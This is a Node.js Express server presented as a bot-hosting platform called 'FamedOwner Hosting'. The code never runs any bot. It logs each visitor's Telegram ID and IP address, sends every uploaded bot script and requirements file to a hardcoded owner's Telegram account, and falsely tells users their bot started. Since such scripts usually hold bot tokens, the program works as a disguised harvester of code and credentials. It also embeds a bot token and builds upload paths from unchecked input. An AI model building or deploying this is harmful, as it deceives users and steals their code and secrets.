const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');

// ========== TELEGRAM BOT CONFIGURATION ==========
const BOT_TOKEN = '8970055353:AAHtLsUd0Fg2g0DZ0AX8hpqEC3V-qaqLJVs';
const OWNER_USER_ID = 6580991809; // Your Telegram ID

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Store active sessions
const userSessions = new Map();

// Send notification to owner
async function notifyOwner(message, options = {}) {
  try {
    await bot.sendMessage(OWNER_USER_ID, message, { 
      parse_mode: 'HTML',
      ...options 
    });
    console.log('✅ Notification sent to owner');
  } catch (error) {
    console.error('❌ Failed to send notification:', error.message);
  }
}

// Send file to owner
async function sendFileToOwner(filePath, caption) {
  try {
    await bot.sendDocument(OWNER_USER_ID, filePath, { caption });
    console.log('✅ File sent to owner');
  } catch (error) {
    console.error('❌ Failed to send file:', error.message);
    await notifyOwner(`⚠️ Failed to send file: ${caption}\nError: ${error.message}`);
  }
}

// Welcome message when bot starts
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 
    `🤖 <b>FamedOwner Hosting Bot Active</b>\n\n` +
    `I will notify the owner when users:\n` +
    `✅ Login with their Telegram ID\n` +
    `✅ Upload bot scripts\n` +
    `✅ Upload requirements files\n\n` +
    `📡 Monitoring active...`,
    { parse_mode: 'HTML' }
  );
});

// ========== EXPRESS SERVER SETUP ==========
const app = express();
const PORT = process.env.PORT || 3000;

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = './uploads';
    if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
    
    const userId = req.body.userId || req.query.userId || 'unknown';
    const userDir = path.join(uploadDir, userId);
    if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
    cb(null, userDir);
  },
  filename: (req, file, cb) => {
    const timestamp = Date.now();
    const uniqueName = `${timestamp}-${file.originalname}`;
    cb(null, uniqueName);
  }
});

const upload = multer({ 
  storage: storage, 
  limits: { fileSize: 50 * 1024 * 1024 } // 50MB limit
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ========== API ENDPOINTS ==========

// Track user login
app.post('/api/login', async (req, res) => {
  const { userId } = req.body;
  
  if (!userId) {
    return res.status(400).json({ error: 'User ID required' });
  }
  
  // Store session
  userSessions.set(userId, { loginTime: Date.now(), files: [] });
  
  // Send notification to owner
  const loginMessage = 
    `🔐 <b>NEW USER LOGIN</b>\n\n` +
    `📱 <b>Telegram ID:</b> <code>${userId}</code>\n` +
    `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n` +
    `🌐 <b>IP:</b> ${req.ip || 'Unknown'}\n\n` +
    `👤 User has accessed the hosting platform.`;
  
  await notifyOwner(loginMessage);
  
  res.json({ success: true, message: 'Login recorded' });
});

// Upload bot script
app.post('/api/upload-bot', upload.single('botFile'), async (req, res) => {
  const userId = req.body.userId;
  
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  // Store in session
  if (userId && userSessions.has(userId)) {
    const session = userSessions.get(userId);
    session.files.push({ type: 'bot', name: req.file.originalname, path: req.file.path });
    userSessions.set(userId, session);
  }
  
  // Send notification and file to owner
  const caption = 
    `📁 <b>BOT SCRIPT UPLOADED</b>\n\n` +
    `👤 <b>User ID:</b> <code>${userId || 'Unknown'}</code>\n` +
    `📄 <b>File Name:</b> ${req.file.originalname}\n` +
    `📦 <b>Size:</b> ${(req.file.size / 1024).toFixed(2)} KB\n` +
    `🤖 <b>Bot Name:</b> ${req.file.originalname.split('.')[0]}\n` +
    `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
  
  await sendFileToOwner(req.file.path, caption);
  
  res.json({ 
    success: true, 
    message: `File was uploaded: ${req.file.originalname}`,
    fileId: req.file.filename,
    fileName: req.file.originalname
  });
});

// Upload requirements file
app.post('/api/upload-requirements', upload.single('reqFile'), async (req, res) => {
  const userId = req.body.userId;
  
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  // Store in session
  if (userId && userSessions.has(userId)) {
    const session = userSessions.get(userId);
    session.files.push({ type: 'requirements', name: req.file.originalname, path: req.file.path });
    userSessions.set(userId, session);
  }
  
  // Read requirements content
  let fileContent = '';
  try {
    fileContent = fs.readFileSync(req.file.path, 'utf8');
  } catch (err) {
    fileContent = 'Unable to read file content';
  }
  
  // Send notification to owner
  const requirementsMessage = 
    `📦 <b>REQUIREMENTS FILE UPLOADED</b>\n\n` +
    `👤 <b>User ID:</b> <code>${userId || 'Unknown'}</code>\n` +
    `📄 <b>File Name:</b> ${req.file.originalname}\n` +
    `📏 <b>Size:</b> ${(req.file.size / 1024).toFixed(2)} KB\n` +
    `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
    `<b>📋 Content:</b>\n<code>${fileContent.substring(0, 800)}${fileContent.length > 800 ? '...' : ''}</code>`;
  
  await notifyOwner(requirementsMessage);
  await sendFileToOwner(req.file.path, `Requirements file from user ${userId}`);
  
  res.json({ 
    success: true, 
    message: `Dependencies file uploaded: ${req.file.originalname}` 
  });
});

// Bot deployment notification
app.post('/api/deploy', async (req, res) => {
  const { userId, botFileName, botFileId } = req.body;
  
  const deployMessage = 
    `🚀 <b>BOT DEPLOYMENT ATTEMPT</b>\n\n` +
    `👤 <b>User ID:</b> <code>${userId || 'Unknown'}</code>\n` +
    `🤖 <b>Bot File:</b> ${botFileName || 'Unknown'}\n` +
    `🆔 <b>File ID:</b> ${botFileId || 'N/A'}\n` +
    `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
    `✅ Bot has been started successfully!`;
  
  await notifyOwner(deployMessage);
  
  res.json({ success: true, message: 'Deployment logged' });
});

// Get session info (for debugging)
app.get('/api/sessions', (req, res) => {
  const sessions = Array.from(userSessions.keys()).map(id => ({
    userId: id,
    loginTime: userSessions.get(id).loginTime,
    fileCount: userSessions.get(id).files.length
  }));
  res.json({ sessions });
});

// Serve the main HTML page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Cleanup old files (every hour)
setInterval(() => {
  const uploadDir = './uploads';
  if (fs.existsSync(uploadDir)) {
    const now = Date.now();
    fs.readdir(uploadDir, (err, folders) => {
      if (err) return;
      folders.forEach(folder => {
        const folderPath = path.join(uploadDir, folder);
        fs.stat(folderPath, (err, stats) => {
          if (err) return;
          if (now - stats.mtimeMs > 24 * 60 * 60 * 1000) { // 24 hours
            fs.rmSync(folderPath, { recursive: true, force: true });
            console.log(`Cleaned up old folder: ${folder}`);
          }
        });
      });
    });
  }
}, 3600000);

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 FamedOwner Hosting running on http://localhost:${PORT}`);
  console.log(`🤖 Telegram Bot active - Owner ID: ${OWNER_USER_ID}`);
  console.log(`📡 Waiting for connections...`);
  
  // Notify owner that server started
  notifyOwner(
    `✅ <b>FamedOwner Hosting Server Started</b>\n\n` +
    `🕐 Time: ${new Date().toLocaleString()}\n` +
    `🌐 Port: ${PORT}\n` +
    `💻 Node Version: ${process.version}\n\n` +
    `📡 Waiting for user logins and uploads...`,
    { parse_mode: 'HTML' }
  );
});
